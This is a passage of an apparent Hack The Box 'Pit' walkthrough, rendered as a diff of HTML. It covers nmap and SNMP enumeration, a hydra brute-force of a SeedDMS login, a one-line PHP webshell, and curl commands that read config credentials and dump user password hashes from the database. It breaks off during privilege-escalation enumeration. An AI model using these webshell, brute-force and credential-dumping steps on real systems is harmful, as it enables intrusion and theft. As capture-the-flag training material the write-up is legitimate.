+SF:0<span class="se">\x</span>20margin:<span class="se">\x</span>200<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20fon
+SF:t-family:<span class="se">\x</span>20<span class="se">\"</span>RedHatDisplay<span class="se">\"</span>,<span class="se">\x</span>20<span class="se">\"</span>Open<span class="se">\x</span>20Sans<span class="se">\"</span>,<span class="se">\x</span>20Helvetica,<span class="se">\x</span>20A
+SF:rial,<span class="se">\x</span>20sans-serif<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20f
+SF:ont-size:<span class="se">\x</span>2012px<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20lin
+SF:e-height:<span class="se">\x</span>201<span class="se">\.</span>66666667<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
+SF:<span class="se">\x</span>20color:<span class="se">\x</span>20#333333<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>2
+SF:0background-color:<span class="se">\x</span>20#f5f5f5<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="o">}</span><span class="se">\n\x</span>20
+SF:<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20img<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\</span>
+SF:x20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20border:<span class="se">\x</span>200<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\</span>
+SF:x20<span class="se">\x</span>20vertical-align:<span class="se">\x</span>20middle<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="o">}</span><span class="se">\n\</span>
+SF:x20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20h1<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>2
+SF:0<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20font-weight:<span class="se">\x</span>20300<span class="p">;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
+SF:<span class="o">}</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20p<span class="se">\x</span>20<span class="o">{</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
+SF:<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20margin:<span class="se">\x</span>200<span class="se">\x</span>200<span class="se">\x</span>2010p<span class="s2">");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 213.97 seconds
+</span></code></pre></div></div>
+
+<p>Based on the information seen in the scan, noticed that the SSL certificate for this machine is <code class="language-plaintext highlighter-rouge">dms-pit.htb</code>, which was later added to the local hosts file.</p>
+
+<h3 id="80tcp-and-9090tcp---http-services">80/TCP and 9090/TCP - HTTP Services</h3>
+
+<p>Accessing the pages, we can see, for <code class="language-plaintext highlighter-rouge">http://10.10.10.241:80</code> the default <code class="language-plaintext highlighter-rouge">nginx</code> page while the <code class="language-plaintext highlighter-rouge">https://10.10.10.241:9090</code> displays a <a href="https://cockpit-project.org/">Cockpit Project — Cockpit Project (cockpit-project.org)</a> Login Page.</p>
+
+<p><img src="https://i.imgur.com/ldyoAq7.png" alt="HTB Pit - Cockpit login page" class="align-center"></p>
+
+<p>Cockpit is a web-based administration interface for Linux Servers and, as the box’s name is part of the name of this solution, we might be on the right path <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"> .</p>
+
+<p>Checking for vulnerabilities for this product, I have found an SSRF vulnerability in version 234 in <code class="language-plaintext highlighter-rouge">searchsploit</code> that we may be able to use once it doesn’t require any valid credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit cockpit
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+ Exploit Title                                                        |  Path
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+Cockpit CMS 0.4.4 &lt; 0.5.5 - Server-Side Request Forgery               | php/webapps/44567.txt
+Cockpit CMS 0.6.1 - Remote Code Execution                             | php/webapps/49390.txt
+Cockpit Version 234 - Server-Side Request Forgery <span class="o">(</span>Unauthenticated<span class="o">)</span>   | multiple/webapps/49397.txt
+openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                    | php/webapps/47305.py
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+Shellcodes: No Results
+
+<span class="nv">$ </span><span class="nb">head</span> <span class="si">$(</span>locate  multiple/webapps/49397.txt<span class="si">)</span>
+<span class="c"># Exploit Title: Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)</span>
+<span class="c"># Date: 08.01.2021</span>
+<span class="c"># Exploit Author: Metin Yunus Kandemir</span>
+<span class="c"># Vendor Homepage: https://cockpit-project.org/</span>
+<span class="c"># Version: v234</span>
+<span class="c"># Tested on: Ubuntu 18.04</span>
+
+<span class="c">#!/usr/bin/python3</span>
+import argparse
+import requests
+</code></pre></div></div>
+
+<p>Reading about this vulnerability on <a href="https://github.com/passtheticket/vulnerability-research/blob/main/cockpitProject/README.md">this Github page</a> we can use this to enumerate and access contents we might not be allowed from other hosts, which could be useful later but, at this moment, won’t help much.</p>
+
+<p>Proceeding with the enumeration, now using <code class="language-plaintext highlighter-rouge">whatweb</code> to speed things a little, I have created a simple bash script to loop to each host and port available, giving us some idea of what we might have published in this system</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">declare</span> <span class="nt">-a</span> <span class="nv">hosts</span><span class="o">=(</span><span class="s2">"10.10.10.241"</span> <span class="s2">"pit.htb"</span> <span class="s2">"dms-pit.htb"</span><span class="o">)</span><span class="p">;</span>
+<span class="nb">declare</span> <span class="nt">-a</span> <span class="nv">ports</span><span class="o">=(</span><span class="s2">"80"</span> <span class="s2">"9090"</span><span class="o">)</span><span class="p">;</span>
+
+<span class="k">for </span>host <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">hosts</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
+        for </span>port <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">ports</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
+                </span>whatweb <span class="nt">--color</span><span class="o">=</span>never <span class="nt">-a</span> 3 <span class="s2">"</span><span class="nv">$host</span><span class="s2">:</span><span class="nv">$port</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> whatweb_enum.txt
+        <span class="k">done
+done</span>
+</code></pre></div></div>
+
+<p>Inspecting the results, found something interesting: when we call the domain <code class="language-plaintext highlighter-rouge">dms-pit.htb</code> we get a <strong>403 Forbidden</strong> response, the ideal scenario to leverage the SSRF vuln in Cockpit, if present <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://dms-pit.htb/ [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], Title[403 Forbidden], nginx[1.14.1]
+</code></pre></div></div>
+
+<p>Making some tests based on the PoC Seen, noticed that the “Connect to” field mentioned isn’t available. Also, checking the PoC videos, noticed that the version we’re running is updated and no longer vulnerable, also confirmed issuing some requests to <code class="language-plaintext highlighter-rouge">/cockpit</code> and don’t succeeding <img class="emoji" title=":disappointed:" alt=":disappointed:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f61e.png" height="20" width="20">.</p>
+
+<p>Based on that, started to enumerate again, both running a <code class="language-plaintext highlighter-rouge">nmap</code> scan for all TCP ports and quick UDP scan as well, to check if we’re missing something here. Also started a gobuster enumeration on <code class="language-plaintext highlighter-rouge">http://10.10.10.241</code> to check for any published website on it.</p>
+
+<p>After some time waiting, <code class="language-plaintext highlighter-rouge">gobuster</code> unfortunately resulted in nothing, as well as TCP for all ports, not showing anything different than we already saw in the quick scan. Surprisingly the UDP scan displayed listed two open ports, as results below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">-sV</span> <span class="nt">-vv</span> <span class="nt">-oA</span> quick_udp 10.10.10.241
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 13:53 <span class="nt">-03</span>
+NSE: Loaded 45 scripts <span class="k">for </span>scanning.
+Initiating Ping Scan at 13:53
+Scanning 10.10.10.241 <span class="o">[</span>4 ports]
+Completed Ping Scan at 13:53, 0.10s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating UDP Scan at 13:53
+Increasing send delay <span class="k">for </span>10.10.10.241 from 800 to 1000 due to 37 out of 121 dropped probes since last increase.
+Warning: 10.10.10.241 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>dms-pit.htb <span class="o">(</span>10.10.10.241<span class="o">)</span>
+Host is up, received echo-reply ttl 63 <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-08-10 13:53:34 <span class="nt">-03</span> <span class="k">for </span>1081s
+Not shown: 998 filtered ports
+Reason: 979 admin-prohibiteds and 19 host-unreaches
+PORT      STATE         SERVICE REASON       VERSION
+161/udp   open          snmp    udp-response SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
+20762/udp open|filtered unknown no-response
+Service Info: Host: pit.htb
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+</code></pre></div></div>
+
+<h3 id="161udp---snmp-service">161/UDP - SNMP Service</h3>
+
+<p>Starting with the SNMP Service, ran <code class="language-plaintext highlighter-rouge">snmp-check</code> and obtained some information from the system and running processes but with a simple run couldn’t obtain much information that could lead us further like passwords, secrets, etc.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmp-check 10.10.10.241
+</code></pre></div></div>
+
+<p>Using another tool, <code class="language-plaintext highlighter-rouge">snmpwalk</code>, as recommended in <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#from-snmp-to-rce">this page</a>, noticed that this tool can enumerate identifiers and specific OIDs (Object Identifiers) but, with the provided information not much data was also retrieved, allowing us to enumerate the accounts in the system, among other information (as well as the processes previously listed.)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Memory usage
+              total        used        free      shared  buff/cache   available
+Mem:          3.8Gi       345Mi       3.1Gi       8.0Mi       452Mi       3.2Gi
+Swap:         1.9Gi          0B       1.9Gi
+Database status
+OK - Connection to database successful.
+System release info
+CentOS Linux release 8.3.2011
+SELinux Settings
+user
+
+                Labeling   MLS/       MLS/
+SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
+
+guest_u         user       s0         s0                             guest_r
+root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
+staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
+sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
+system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+user_u          user       s0         s0                             user_r
+xguest_u        user       s0         s0                             xguest_r
+login
+
+Login Name           SELinux User         MLS/MCS Range        Service
+
+__default__          unconfined_u         s0-s0:c0.c1023       *
+michelle             user_u               s0                   *
+root                 unconfined_u         s0-s0:c0.c1023       *
+System uptime
+ 13:33:08 up 37 min,  0 users,  load average: 0.19, 0.10, 0.18
+</code></pre></div></div>
+
+<p>Searching for other opportunities to enumerate SNMP devices, came across this page <a href="https://lrodrigo.sgs.lncc.br/wp/dicas/smnpcomandos-disponiveis-no-linux/snmpcomandos-snmpwalk/">SNMP:Comandos – snmpwalk – LRodrigo – Web Site (lncc.br)</a> talking about some commands also using <code class="language-plaintext highlighter-rouge">snmpwalk</code>. The interesting here is that if you specify the OID until certain point, it lists all information about it, as SNMP works like a tree like the image below, extracted from Wikimedia.org:</p>
+
+<p><img src="https://i.imgur.com/Gb2LBgj.png" alt="HTB Pit - SNMP Tree - source: wikimedia.org"></p>
+
+<p>Once the root (in red on the image) doesn’t change, decided to run <code class="language-plaintext highlighter-rouge">snmpwalk</code> once again, but specifying from where I wanted to inspect, which was <strong>right from the root</strong> (.1) and then filtered the empty values, using the command below”</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmpwalk <span class="nt">-v</span> 1 <span class="nt">-c</span> public 10.10.10.241  .1 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\"\"</span><span class="s2">$"</span>
+</code></pre></div></div>
+
+<p>Things got interesting when reviewing the output where, right after the process’s lists, an OID <strong>.1.3.6.1.4.1.2021</strong> was displaying some nginx information, previously unseen based on previous enumerations, one of them mentioning the path <code class="language-plaintext highlighter-rouge">/var/www/html/seeddms51x/seeddms</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iso.3.6.1.4.1.2021.2.1.1.1 = INTEGER: 1
+iso.3.6.1.4.1.2021.2.1.2.1 = STRING: "nginx"
+iso.3.6.1.4.1.2021.2.1.3.1 = INTEGER: 1
+iso.3.6.1.4.1.2021.2.1.4.1 = INTEGER: 0
+iso.3.6.1.4.1.2021.2.1.5.1 = INTEGER: 3
+iso.3.6.1.4.1.2021.2.1.100.1 = INTEGER: 0
+iso.3.6.1.4.1.2021.2.1.102.1 = INTEGER: 0
+iso.3.6.1.4.1.2021.9.1.1.1 = INTEGER: 1
+iso.3.6.1.4.1.2021.9.1.1.2 = INTEGER: 2
+iso.3.6.1.4.1.2021.9.1.2.1 = STRING: "/"
+iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
+iso.3.6.1.4.1.2021.9.1.3.1 = STRING: "/dev/mapper/cl-root"
+iso.3.6.1.4.1.2021.9.1.3.2 = STRING: "/dev/mapper/cl-seeddms"
+iso.3.6.1.4.1.2021.9.1.4.1 = INTEGER: 10000
+iso.3.6.1.4.1.2021.9.1.4.2 = INTEGER: 100000
+iso.3.6.1.4.1.2021.9.1.5.1 = INTEGER: -1
+iso.3.6.1.4.1.2021.9.1.5.2 = INTEGER: -1
+iso.3.6.1.4.1.2021.9.1.6.1 = INTEGER: 2611200
+iso.3.6.1.4.1.2021.9.1.6.2 = INTEGER: 125600
+iso.3.6.1.4.1.2021.9.1.7.1 = INTEGER: 374736
+</code></pre></div></div>
+
+<p>Switched back to browser and navigated to all domains appending the path we have found, and the <strong>SeedDMS</strong> portal was accessible via <code class="language-plaintext highlighter-rouge">http://dms-pit.htb/seeddms51x/seeddms</code> as we can see below</p>
+
+<p><img src="https://i.imgur.com/PsX5dm0.png" alt="HTB Pit - SeedDMS" class="align-center"></p>
+
+<h2 id="initial-access">Initial access</h2>
+
+<p>Giving a quick check in <code class="language-plaintext highlighter-rouge">searchsploit</code> found some existing exploits for this app but all of them requires us to be authenticated to work.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit seeddms
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+ Exploit Title                                                        |  Path
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+Seeddms 5.1.10 - Remote Command Execution <span class="o">(</span>RCE<span class="o">)</span> <span class="o">(</span>Authenticated<span class="o">)</span>       | php/webapps/50062.py
+SeedDMS 5.1.18 - Persistent Cross-Site Scripting                      | php/webapps/48324.txt
+SeedDMS &lt; 5.1.11 - <span class="s1">'out.GroupMgr.php'</span> Cross-Site Scripting            | php/webapps/47024.txt
+SeedDMS &lt; 5.1.11 - <span class="s1">'out.UsrMgr.php'</span> Cross-Site Scripting              | php/webapps/47023.txt
+SeedDMS versions &lt; 5.1.11 - Remote Command Execution                  | php/webapps/47022.txt
+<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>As we have some usernames and this is half of the answer, obtained from <code class="language-plaintext highlighter-rouge">snmpwalk</code> scans where <strong>michelle</strong> was found, we can try to guess or brute-force it using <code class="language-plaintext highlighter-rouge">hydra</code>, where we interestingly found the password as the same as the username:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-l</span> michelle <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt dms-pit.htb http-post-form <span class="s2">"/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:Error"</span> <span class="nt">-t</span> 10
+Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
+
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-08-10 16:05:20
+<span class="o">[</span>DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~1434440 tries per task
+<span class="o">[</span>DATA] attacking http-post-form://dms-pit.htb:80/seeddms51x/seeddms/op/op.Login.php:login<span class="o">=</span>^USER^&amp;pwd<span class="o">=</span>^PASS^&amp;lang<span class="o">=</span>:Error
+<span class="o">[</span>80][http-post-form] host: dms-pit.htb   login: michelle   password: michelle
+1 of 1 target successfully completed, 1 valid password found
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-08-10 16:05:24
+</code></pre></div></div>
+
+<p>Now that we have access to SeedDMS, we can use it to exploit the vulnerability, which, after uploading a php document, in this case a simple webshell (<code class="language-plaintext highlighter-rouge">&lt;?php system($_GET["cmd"]); ?&gt;</code>), we were able to execute commands using <code class="language-plaintext highlighter-rouge">curl</code> leveraging the Document ID of the uploaded file, in this case <strong>31</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/31/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=id'</span>
+<span class="nv">uid</span><span class="o">=</span>992<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<p>Besides having now RCE machine, every reverse shell command I try fails. I have tried several ways (bash, python, external payload, etc) and none of them worked, possibly due to SELinux enabled on the box. Based on that, decided to use the webshell to enumerate the system.</p>
+
+<p>Checking <a href="https://github.com/JustLikeIcarus/SeedDMS/blob/master/conf/settings.xml.template">SeedDMS project page on GitHub</a>, identified that there’s a <code class="language-plaintext highlighter-rouge">/conf/settings.xml</code> file which contains the credentials to the database, which could be reused for other users in the system.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/33/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=cat /var/www/html/seeddms51x/conf/settings.xml'</span> | <span class="nb">grep </span>database
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 11933    0 11933    0     0  77993      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 77993
+    &lt;edition <span class="nv">strictFormCheck</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">viewOnlineFileTypes</span><span class="o">=</span><span class="s2">".txt;.text;.html;.htm;.xml;.pdf;.gif;.png;.jpg;.jpeg"</span> <span class="nv">enableConverting</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableEmail</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableUsersView</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableFullSearch</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">enableClipboard</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableFolderTree</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">expandFolderTree</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">enableLanguageSelector</span><span class="o">=</span><span class="s2">"true"</span> <span class="nv">stopWordsFile</span><span class="o">=</span><span class="s2">""</span> <span class="nv">sortUsersInList</span><span class="o">=</span><span class="s2">""</span> <span class="nv">enableDropUpload</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableRecursiveCount</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">maxRecursiveCount</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">enableThemeSelector</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">fullSearchEngine</span><span class="o">=</span><span class="s2">"sqlitefts"</span> <span class="nv">sortFoldersDefault</span><span class="o">=</span><span class="s2">"u"</span> <span class="nv">editOnlineFileTypes</span><span class="o">=</span><span class="s2">""</span> <span class="nv">enableMenuTasks</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableHelp</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">defaultSearchMethod</span><span class="o">=</span><span class="s2">"database"</span> <span class="nv">libraryFolder</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">maxSizeForFullText</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">showSingleSearchHit</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableSessionList</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableDropFolderList</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">enableMultiUpload</span><span class="o">=</span><span class="s2">"false"</span> <span class="nv">defaultDocPosition</span><span class="o">=</span><span class="s2">"end"</span><span class="o">&gt;</span>
+       - restricted: Restricted access: only allow <span class="nb">users </span>to log <span class="k">in if </span>they have an entry <span class="k">in </span>the <span class="nb">local </span>database <span class="o">(</span>irrespective of successful authentication with LDAP<span class="o">)</span><span class="nb">.</span>
+       - dbDatabase: database where the tables <span class="k">for </span>seeddms are stored <span class="o">(</span>optional - see adodb-readme<span class="o">)</span>
+       - dbUser: username <span class="k">for </span>database-access
+       - dbPass: password <span class="k">for </span>database-access
+    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">"mysql"</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">"localhost"</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">"seeddms"</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">"seeddms"</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">"ied^ieY6xoquu"</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">"false"</span><span class="o">&gt;</span>
+    &lt;/database&gt;
+</code></pre></div></div>
+
+<p>Using mysql command line, enumerated tables, columns and then retrieved the username, pwd and role from the users in database</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List Tables</span>
+<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/30/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e "use seeddms; select login,pwd,role from tblUsers; exit"'</span>
+<span class="o">[</span>...]
+
+<span class="c"># List Columns from tblUsers</span>
+<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/34/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e "use seeddms; show columns from tblUsers; exit"'</span>
+<span class="o">[</span>...]
+
+<span class="c"># Dump credentials</span>
+<span class="nv">$ </span>curl <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://dms-pit.htb/seeddms51x/data/1048576/30/1.php'</span> <span class="nt">--data-urlencode</span> <span class="s1">'cmd=mysql -u seeddms --password=ied^ieY6xoquu -e "use seeddms; select login,pwd,role from tblUsers; exit"'</span>
+login   <span class="nb">pwd     </span>role
+admin   155dd275b4cb74bd1f80754b61148863        1
+guest   NULL    2
+michelle        2345f10bb948c5665ef91f6773b3e455        0
+jack    682d305fdaabc156430c4c6f6f5cc65d        0
+</code></pre></div></div>
+
+<p>With the hashes, tried to crack them using <code class="language-plaintext highlighter-rouge">john</code> and <code class="language-plaintext highlighter-rouge">rockyou.txt</code> but with no success.</p>
+
+<p>As we have the database credentials, remembered that we have access to the cockpit page, where the credentials could not be validated for user <code class="language-plaintext highlighter-rouge">seeddms</code> but worked successfully for <code class="language-plaintext highlighter-rouge">michelle</code>.</p>
+
+<p>Accessing the terminal from the web portal, was able to get the <code class="language-plaintext highlighter-rouge">user.txt</code> hash</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>michelle@pit ~]<span class="nv">$ </span><span class="nb">ls 
+</span>check.sh  user.txt
+<span class="o">[</span>michelle@pit ~]<span class="nv">$ </span><span class="nb">cat </span>user.txt
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>After submitting the flag, was unable to run <code class="language-plaintext highlighter-rouge">sudo -l</code> as usually done, so started the enumeration from <code class="language-plaintext highlighter-rouge">michelle</code>’s account using <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, where nothing too interesting was found besides an uncommon file containing particular privileges.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+# file: /usr/local/monitoring
+USER   root      rwx
+user   michelle  -wx
+GROUP  root      rwx
+mask             rwx
+other            ---                  
+</code></pre></div></div>
+
